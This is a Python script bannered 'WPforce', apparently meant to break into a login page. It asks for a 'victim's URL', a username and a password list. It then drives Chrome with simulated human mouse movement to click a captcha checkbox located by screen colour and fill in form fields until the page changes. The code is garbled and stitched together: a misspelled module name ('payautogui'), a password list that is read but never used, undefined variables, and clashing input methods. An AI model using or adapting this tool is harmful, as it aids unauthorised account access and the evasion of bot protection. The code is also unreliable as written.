import os
import sys
import time
import argparse
import payautogui
from random import randint
import pyscreenshot as ImageGrab
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import requests
import urllib
import urllib3
from urllib.request import urlopen, Request
from http.cookiejar import CookieJar
import threading
from queue import Queue
from html.parser import HTMLParser

# Banner
print("========================================")
print("             WPforce - by Glitch422")
print("========================================")

# Get user input
url = input("Please enter the victim's URL: ")
username = input("Please enter the username: ")
password_path = input("Please enter the password list (name of the file or path): ")

# Read the password list
with open(password_path, 'r') as passlist:
    passwords = passlist.read().splitlines()

# Function to finish the program
def finish():
    sys.exit()

# Get command line arguments
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, action='store', help='Option')
    my_args = parser.parse_args()
    return my_args

# Function to simulate mouse movement
def move(obj_x, obj_y, t, mov_val, delay):
    time.sleep(delay)
    init_t = t
    init_mov_val = mov_val

    while True:
        current_x, current_y = payautogui.position()
        mov_val = int(mov_val)

        if abs(current_x - obj_x) < min_diff:
            randx = 0
        else:
            if current_x < obj_x:
                randx = abs(randint(0, mov_val))
            else:
                randx = -1 * abs(randint(0, mov_val))

        if abs(current_y - obj_y) < min_diff:
            randy = 0
            if randx == 0:
                break
        else:
            if current_y < obj_y:
                randy = abs(randint(0, mov_val))
            else:
                randy = -1 * abs(randint(0, mov_val))

        payautogui.moveRel(randx, randy, t)

        if t > 0.001:
            t *= 0.97
            mov_val *= 0.97
        else:
            t = init_t
            mov_val = init_mov_val
            break

# Function to check if a certain color is present
def checkGreen():
    image = ImageGrab.grab()
    verde = (0, 158, 85)
    w, h = payautogui.size()
    count = 0

    for y in range(0, h - 1):
        for x in range(0, w - 1):
            color = image.getpixel((x, y))
            if color == verde:
                count += 1

    return count > 50

# Function to locate a specific color
def colorLocate():
    image = ImageGrab.grab()
    w, h = payautogui.size()
    offset = 100
    y = offset
    coordinates_x = []
    coordinates_y = []

    while y < (h - offset):
        y += 1
        line_colors = []
        for x in range(0, w - 1):
            color = image.getpixel((x, y))
            line_colors.append(color)

        srch_clr_1 = (155, 155, 155)
        srch_clr_2 = (167, 195, 231)

        if srch_clr_1 in line_colors and srch_clr_2 in line_colors:
            for x in range(0, w - 1):
                color = image.getpixel((x, y))
                if color == srch_clr_2:
                    if x not in coordinates_x:
                        coordinates_x.append(x)
                    if y not in coordinates_y:
                        coordinates_y.append(y)

    coordx = int(sum(coordinates_x) / len(coordinates_x))
    coordy = int(sum(coordinates_y) / len(coordinates_y))
    return coordx, coordy

# Function to open Chrome browser
def openchrome(url):
    options = webdriver.ChromeOptions()
    options.add_argument("--start-maximized")
    options.add_argument("--incognito")
    options.add_argument("--disable-infobars")
    driver = webdriver.Chrome('C:/chromedriver.exe', options=options)
    if url is not None:
        driver.get(url)
    return driver

# Function to perform random mouse movement
def randomMovement(n):
    for i in range(0, n):
        move(randint(min_offset, w - min_offset), randint(min_offset, h - min_offset), 0.05, 50, 0)

# Function to prepare elements for input
def prepareElements(n):
    texts = []
    positions = []

    for it in range(1, int(n) + 1):
        text = input("Text for element " + str(it) + ": ")
        texts.append(text)

    for it in range(1, int(n) + 1):
        input("Put cursor over element " + str(it) + " and press Enter")
        positions.append(payautogui.position())

    return texts, positions

# Main function
def main():
    args = get_args()
    target_url = args.url

    driver = openchrome(target_url)
    number_inputs_pre = input("Number of elements before captcha: ")
    pre_texts, pre_positions = prepareElements(number_inputs_pre)
    number_inputs_post = input("Number of elements after captcha: ")
    post_texts, post_positions = prepareElements(number_inputs_post)
    driver.close()

    done = False

    while not done:
        print("Initializing...")

        randomMovement(1)

        driver = openchrome(target_url)
        time.sleep(2)

        for ind in range(0, len(pre_positions)):
            pos = pre_positions[ind]
            txt = pre_texts[ind]
            move(pos[0], pos[1], 0.1, 30, 0)
            payautogui.click()
            payautogui.typewrite(txt)
            time.sleep(1)

        coords = colorLocate()
        while abs(payautogui.position()[0] - coords[0]) > 100 or abs(payautogui.position()[1] - coords[1]) > 100:
            move(coords[0], coords[1], 0.1, 30, 0)
        payautogui.click()
        time.sleep(2)
        done = checkGreen()

        randomMovement(1)

        for ind in range(0, len(post_positions)):
            pos = post_positions[ind]
            txt = post_texts[ind]
            payautogui.moveTo(pos[0], pos[1])
            payautogui.click()
            payautogui.typewrite(txt)
            time.sleep(1)

        time.sleep(5)
        if driver.current_url != target_url:
            print("SUCCESS")
            finish()
        driver.close()
        
# Define the min_diff and min_offset values
min_diff = 3
min_offset = 200

# Call the main function if the script is run directly
if __name__ == "__main__":
    main()


